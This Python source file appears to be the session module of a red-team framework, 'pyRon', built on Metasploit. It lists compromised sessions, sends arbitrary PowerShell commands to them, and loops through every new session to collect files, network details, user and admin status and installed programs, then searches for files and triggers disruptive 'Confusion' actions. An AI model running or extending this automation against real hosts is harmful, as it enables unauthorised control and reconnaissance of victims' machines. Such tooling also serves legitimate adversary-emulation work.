#!/usr/bin/env python3
# Takes in a session from mainMenu of pyRon and you are able to send commands to it
# Has it's own menu which can exit into mainMenu just by returning false
import os
import pathlib
import sys
dir_path = os.path.dirname(os.path.realpath(__file__))
sys.path.append(os.path.abspath(os.path.join(dir_path, os.pardir)))
import json
import random
import time
import logging
from pymetasploit3.msfrpc import MsfError
from transportModule import transportModule
from data.data_services import create_session
from lib.Reconnaissance.reconnaissance import Reconnaissance
from lib.Confusion.confusion import Confusion
from lib.PrivilegeEscalation.escalation import Escalation
from lib.Automation.searchFiles import searchFiles
from data.event import EventUtils
from masterLogger import masterLogger
logger = masterLogger('logs', 'logs/session.log', __name__)

class sessionMod:

    def __init__(self, msfclient):
        self.msfclient = msfclient
        self.dumpSession()
        self.retrieveSession()
    
    def dumpSession(self):
        '''
        Dump current session into a json file
        '''
        try:
            with open('json/sessionJSON.json', 'w') as fp:
                json.dump(self.msfclient.client.sessions.list, fp, indent=4)
        except Exception as msg:
            print(msg)
            pass
    
    def retrieveSession(self):
        '''
        Retrieve session from json file
        '''
        try:
            json_file = open('json/sessionJSON.json')
            json_read = json_file.read()
            sessionFromJson = json.loads(json_read)
            create_session(sessionFromJson)
            return sessionFromJson
        except Exception as msg:
            logger.info(msg)
            print(msg)
            pass
        
    def sessionPrint(self):
        '''
        Prints session by parsing the json file
        '''
        try:
            self.dumpSession()
            currentSession = self.retrieveSession()
            for s_id, s_info in currentSession.items():
                print("\nSession ID: ", s_id)
                for info in s_info:
                    print(info + ':', s_info[info])
        except Exception as msg:
            logger.info(msg)
            print(msg)
            pass

    def sessionMenu(self):
        '''
        sessionModule
        1 will print session
        2 will send the command to session
        3 will start active session
        4 will start transport list
        anything afterwards will be mainly testing
        '''
        menuGoing = False
        print("\n[!]Entering Session Module")
        while menuGoing == False:
            try:
                print("\n[***]Session Module[***]\n")
                print("1.) Print Current Sessions")
                print("2.) Send Command to Session")
                print("3.) Start active session controller")
                print("4.) Transport List")
                print("5.) Testing Recon")
                print("6.) Testing other PowerShell cmds")
                print("press 0 to exit...")
                selection = int(input("[!] Please select an option: "))
                if selection == 1:
                    self.sessionPrint()
                if selection == 2:
                    self.sessionSendCommand()
                if selection == 3:
                    self.activeSessionController()
                if selection == 4:
                    _transport = self.retrieveSession()
                    _transport_list = []
                    for s in _transport:
                        _transport_list.append(s)
                        print(f"Session ID: {s}")
                    _transport_input = input("[!]Please select session for transport list: ")
                    self.transportModule = transportModule(_transport_input, self.msfclient)
                    self.transportModule.printTransportList()
                if selection == 5:
                    session_input = input("Please select a session: ")
                    recon = Reconnaissance()
                    # recon.gatherNetwork(self.msfclient, session_input)
                    # recon.gatherCurrentAdmin(self.msfclient, session_input)
                    # recon.gatherWhoAmI(self.msfclient, session_input)
                    # recon.gatherPWD(self.msfclient, session_input)
                    recon.gatherFiles(self.msfclient, session_input)
                    recon.gatherInstalledPrograms(self.msfclient, session_input)
                    # recon.gatherPID(self.msfclient, session_input)
                    # recon.gatherDomain(self.msfclient, session_input)
                if selection == 6:
                    Confusion.openAlertBox(self, self.msfclient, '1')
                    # Confusion.changeWallpaper(self, self.msfclient, '2')
                    # Confusion.moveIntoProcess(self, self.msfclient, '1')
                if selection == 7:
                    session_input = input("Please select a session: ")
                    recon = Reconnaissance()
                    recon.gatherPID(self.msfclient, session_input)
                if selection == 0:
                    return True
            except ValueError:
                logger.info("Enter the wrong input in session menu")
                print("Wrong input!")
                continue
    
    def sessionSendCommand(self):
        '''
        Sends a command to a session.
        Currently just sends a random powershell command and returns the output.
        TODO:
        Want to send more than just powershell commands.
        Can select what kind of command to send.
        '''
        try:
            sessionList = []
            self.dumpSession()
            dumpedSesssion = self.retrieveSession()
            for s_id in dumpedSesssion:
                sessionList.append(s_id)
            for avail in sessionList:
                print(f"[+]Session {avail} ready!")
            sessionInput = input("[!]Which session: ")
            print(f'[+]Selected session {sessionInput}')
            sessionCMD = input("[!]Send what cmd: ")
            print(self.msfclient.client.sessions.session(sessionInput).run_psh_cmd(sessionCMD))
        except Exception as msg:
            logger.info(msg)
            print(msg)
            pass

    def activeSessionController(self):
        '''
        Loops through sending commands to random sessions that are available through dumping and reading the json file.
        TODO:
        Adding a way to better handle dying connections.
        '''
        try:
            g = True
            sessionList = []
            sessionsGathered = []
            infoGathered = False
            while g == True:
                try:
                    while infoGathered == True:
                            print("[!]Waiting for new session...")
                            self.dumpSession()
                            dumpedSession = self.retrieveSession()
                            for s_id in dumpedSession:
                                if not s_id in sessionsGathered:
                                    EventUtils.settingEvent(self, "Found new session: " + s_id)
                                    sessionList.append(s_id)
                                    infoGathered = False
                            time.sleep(5)
                    if not sessionList:
                        self.dumpSession()
                        dumpedSession = self.retrieveSession()
                        for s_id in dumpedSession:
                            sessionList.append(s_id)
                        while not sessionList:
                            print("\n[!]No sessions. Waiting for sessions...\n")
                            time.sleep(5)
                            self.dumpSession()
                            dumpedSession = self.retrieveSession()
                            for s_id in dumpedSession:
                                sessionList.append(s_id)
                    else:
                        for avail in sessionList:
                            print(f"[+]Session {avail} ready!")
                            EventUtils.settingEvent(self, "Selected: " + avail)
                            print(f'[+]Selected session {avail}')
                            recon = Reconnaissance()
                            search = searchFiles(self.msfclient)
                            print('Gather is currenty working directory')
                            recon.gatherPWD(self.msfclient, avail)
                            time.sleep(5)
                            print('Gathering files in directory')
                            recon.gatherFiles(self.msfclient, avail)
                            time.sleep(5)
                            print('Gathering session network')
                            recon.gatherNetwork(self.msfclient, avail)
                            time.sleep(5)
                            print('Gathering current user')
                            recon.gatherWhoAmI(self.msfclient, avail)
                            time.sleep(5)
                            print('Gather if user is Admin')
                            recon.gatherCurrentAdmin(self.msfclient, avail)
                            time.sleep(5)
                            print('Gathering installed programs')
                            recon.gatherInstalledPrograms(self.msfclient, avail)
                            time.sleep(5)
                            print('Checking for files...')
                            search.searchencrypt(avail)
                            sessionsGathered.append(avail)
                            sessionList.remove(avail)
                            # check_error = _output.split(" ")
                            # if check_error[0] == '[-]':
                            #     print(f"[!]Session {selectedSession} threw timeout error.")
                            #     print("[!]Killing session...")
                            #     self.msfclient.client.consoles.console(self.msfclient.console).write(f'sessions -k {selectedSession}')
                            #     time.sleep(10)
                    if not sessionList:
                        print("[!]All info gathered! Waiting for new session...")
                        EventUtils.settingEvent(self, "All info gathered, waiting for new session.")
                        infoGathered = True
                        pass
                except KeyboardInterrupt:
                    exit = input("[+]Would you like to exit y/n: ").upper()
                    if exit == 'Y':
                        return False
                    elif exit == 'N':
                        return True
                except MsfError:
                    print(f"[!]Session {avail} threw timeout error.")
                    print("[!]Killing session...")
                    self.msfclient.client.consoles.console(self.msfclient.console).write(f'sessions -k {avail}')
                    time.sleep(10)
                    continue
        except Exception as msg:
            logger.info(msg)
            print(msg)
            pass